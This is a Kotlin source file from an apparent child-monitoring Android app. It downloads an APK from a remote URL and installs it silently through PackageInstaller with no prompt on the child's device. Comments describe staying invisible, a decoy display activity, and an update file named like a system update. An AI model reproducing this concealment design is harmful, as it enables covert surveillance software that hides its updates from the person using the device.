package com.vyra.kids.core

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Build
import android.util.Log
import androidx.core.content.FileProvider
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

object AppUpdateManager {

    const val ACTION_UPDATE_STATUS_CHANGED = "com.vyra.kids.ACTION_UPDATE_STATUS_CHANGED"
    private const val TAG = "AppUpdateManager"
    private const val UPDATE_FILE_NAME = "system_update.apk"

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    @Volatile
    var isDownloading: Boolean = false
        private set

    @Volatile
    var downloadProgress: Int = 0
        private set

    /**
     * Downloads the latest child APK in the background and saves it to cache directory.
     */
    fun downloadUpdate(
        context: Context,
        apkUrl: String,
        onProgress: ((Int) -> Unit)? = null,
        onComplete: ((File?) -> Unit)? = null
    ) {
        if (isDownloading) {
            Log.w(TAG, "Download already in progress")
            return
        }

        isDownloading = true
        downloadProgress = 0

        val appContext = context.applicationContext
        val targetFile = File(appContext.cacheDir, UPDATE_FILE_NAME)

        appContext.sendBroadcast(
            Intent(ACTION_UPDATE_STATUS_CHANGED)
                .putExtra("isDownloading", true)
                .putExtra("progress", 0)
                .setPackage(appContext.packageName)
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                Log.i(TAG, "Starting OTA APK download from: $apkUrl")
                val request = Request.Builder().url(apkUrl).build()
                val response = httpClient.newCall(request).execute()

                if (!response.isSuccessful) {
                    Log.e(TAG, "Failed to download update APK: HTTP ${response.code}")
                    isDownloading = false
                    appContext.sendBroadcast(
                        Intent(ACTION_UPDATE_STATUS_CHANGED)
                            .putExtra("isDownloading", false)
                            .putExtra("error", true)
                            .setPackage(appContext.packageName)
                    )
                    withContext(Dispatchers.Main) { onComplete?.invoke(null) }
                    return@launch
                }

                val body = response.body ?: run {
                    Log.e(TAG, "Empty response body from update server")
                    isDownloading = false
                    appContext.sendBroadcast(
                        Intent(ACTION_UPDATE_STATUS_CHANGED)
                            .putExtra("isDownloading", false)
                            .putExtra("error", true)
                            .setPackage(appContext.packageName)
                    )
                    withContext(Dispatchers.Main) { onComplete?.invoke(null) }
                    return@launch
                }

                val contentLength = body.contentLength()
                val inputStream = body.byteStream()
                val outputStream = FileOutputStream(targetFile)

                val buffer = ByteArray(8192)
                var bytesRead: Int
                var totalBytesRead = 0L

                while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                    outputStream.write(buffer, 0, bytesRead)
                    totalBytesRead += bytesRead
                    if (contentLength > 0) {
                        val progress = ((totalBytesRead * 100) / contentLength).toInt()
                        downloadProgress = progress
                        withContext(Dispatchers.Main) {
                            onProgress?.invoke(progress)
                            appContext.sendBroadcast(
                                Intent(ACTION_UPDATE_STATUS_CHANGED)
                                    .putExtra("isDownloading", true)
                                    .putExtra("progress", progress)
                                    .setPackage(appContext.packageName)
                            )
                        }
                    }
                }

                outputStream.flush()
                outputStream.close()
                inputStream.close()
                response.close()

                isDownloading = false
                downloadProgress = 100

                val prefs = PrefsManager.getInstance(appContext)
                prefs.isUpdateAvailable = true
                prefs.updateDownloadedPath = targetFile.absolutePath

                Log.i(TAG, "OTA APK downloaded successfully (${targetFile.length()} bytes)")

                withContext(Dispatchers.Main) {
                    onProgress?.invoke(100)
                    onComplete?.invoke(targetFile)
                    // Notify listening activities (e.g. DecoyDisplayActivity)
                    appContext.sendBroadcast(
                        Intent(ACTION_UPDATE_STATUS_CHANGED)
                            .putExtra("isDownloading", false)
                            .putExtra("progress", 100)
                            .putExtra("ready", true)
                            .setPackage(appContext.packageName)
                    )
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error downloading update APK", e)
                isDownloading = false
                appContext.sendBroadcast(
                    Intent(ACTION_UPDATE_STATUS_CHANGED)
                        .putExtra("isDownloading", false)
                        .putExtra("error", true)
                        .setPackage(appContext.packageName)
                )
                withContext(Dispatchers.Main) { onComplete?.invoke(null) }
            }
        }
    }

    /**
     * Silently installs the OTA APK via PackageInstaller session API.
     * No UI dialog appears on the child device — fully transparent background install.
     * Same-keystore → in-place update, app never uninstalled.
     * Falls back to ACTION_VIEW (prompts user) only if session API is unavailable.
     */
    fun installUpdate(context: Context, apkFile: File? = null): Boolean {
        val appContext = context.applicationContext
        val prefs = PrefsManager.getInstance(appContext)

        val fileToInstall = apkFile ?: run {
            val path = prefs.updateDownloadedPath
            if (path.isNotBlank()) File(path) else File(appContext.cacheDir, UPDATE_FILE_NAME)
        }

        if (!fileToInstall.exists() || fileToInstall.length() < 100_000L) {
            Log.e(TAG, "Cannot install: APK file missing or corrupted (${fileToInstall.length()} bytes)")
            return false
        }

        // Verify REQUEST_INSTALL_PACKAGES is granted (required on API 26+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!appContext.packageManager.canRequestPackageInstalls()) {
                Log.w(TAG, "REQUEST_INSTALL_PACKAGES not granted — sending user to Settings silently")
                // We don't pop up Settings here to stay invisible; just log and skip.
                // On the next OTA trigger after the parent enables the permission via SetupWizard, it will work.
                return false
            }
        }

        // ── Silent PackageInstaller session-based install ─────────────────────────
        return try {
            val installer = appContext.packageManager.packageInstaller
            val sessionParams = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            ).apply {
                setAppPackageName(appContext.packageName)
                setSize(fileToInstall.length())
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
                }
            }

            val sessionId = installer.createSession(sessionParams)
            val session: PackageInstaller.Session = installer.openSession(sessionId)

            // Stream APK bytes into the session
            session.use { s ->
                FileInputStream(fileToInstall).use { input ->
                    s.openWrite("vyra_ota.apk", 0, fileToInstall.length()).use { output ->
                        val buffer = ByteArray(65_536)
                        var bytes: Int
                        while (input.read(buffer).also { bytes = it } >= 0) {
                            output.write(buffer, 0, bytes)
                        }
                        s.fsync(output)
                    }
                }

                // Build a silent broadcast PendingIntent as the status receiver
                val broadcastIntent = Intent("com.vyra.kids.OTA_INSTALL_STATUS").apply {
                    setPackage(appContext.packageName)
                }
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                } else {
                    PendingIntent.FLAG_UPDATE_CURRENT
                }
                val statusPendingIntent = PendingIntent.getBroadcast(
                    appContext, sessionId, broadcastIntent, flags
                )

                s.commit(statusPendingIntent.intentSender)
                Log.i(TAG, "PackageInstaller session committed (id=$sessionId) — silent OTA install triggered")
            }
            true
        } catch (e: Exception) {
            Log.e(TAG, "Silent PackageInstaller session failed — falling back to ACTION_VIEW", e)
            // Fallback: show install dialog (visible to child but doesn't break the update)
            try {
                val authority = "${appContext.packageName}.fileprovider"
                val apkUri = FileProvider.getUriForFile(appContext, authority, fileToInstall)
                val intent = Intent(Intent.ACTION_VIEW).apply {
                    setDataAndType(apkUri, "application/vnd.android.package-archive")
                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                appContext.startActivity(intent)
                true
            } catch (fe: Exception) {
                Log.e(TAG, "Fallback ACTION_VIEW also failed", fe)
                false
            }
        }
    }

    /**
     * Checks if a valid, complete update APK is downloaded and ready to install.
     */
    fun isDownloadedUpdateReady(context: Context): Boolean {
        val prefs = PrefsManager.getInstance(context)
        val path = prefs.updateDownloadedPath
        if (path.isNotBlank()) {
            val file = File(path)
            if (file.exists() && file.length() > 100_000L) return true
        }
        val defaultFile = File(context.cacheDir, UPDATE_FILE_NAME)
        return defaultFile.exists() && defaultFile.length() > 100_000L
    }

    fun clearUpdate(context: Context) {
        val prefs = PrefsManager.getInstance(context)
        prefs.isUpdateAvailable = false
        prefs.updateDownloadedPath = ""
        try {
            val file = File(context.cacheDir, UPDATE_FILE_NAME)
            if (file.exists()) file.delete()
        } catch (_: Exception) {}
    }
}
